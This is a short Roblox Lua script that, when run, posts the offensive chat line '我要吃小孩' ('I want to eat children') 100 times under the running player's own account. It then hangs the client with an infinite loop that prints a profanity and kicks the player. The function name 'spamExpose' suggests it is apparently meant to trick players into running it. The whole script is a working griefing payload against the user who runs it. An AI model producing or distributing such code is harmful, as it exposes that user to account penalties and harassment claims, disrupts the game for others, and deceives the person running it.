local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local player = Players.LocalPlayer

local function Caton()
    coroutine.wrap(function()
        while true do
            print("Fuck You")
        end
    end)()
end

local function spamExpose()
    local textChannelContainer = TextChatService:FindFirstChild("TextChannels")
    if textChannelContainer then
        local general = textChannelContainer:FindFirstChild("RBXGeneral")
        if general then
            for i = 1, 100 do
                task.spawn(function()
                    pcall(function()
                        general:SendAsync("我要吃小孩")
                    end)
                end)
                task.wait(0.01)
            end
        else
            warn("聊天频道RBXGeneral未找到.")
        end
    else
        warn("TextChannels未加载.")
    end
end
   
spamExpose()
Caton()
task.wait(5) 
player:Kick("LOL")
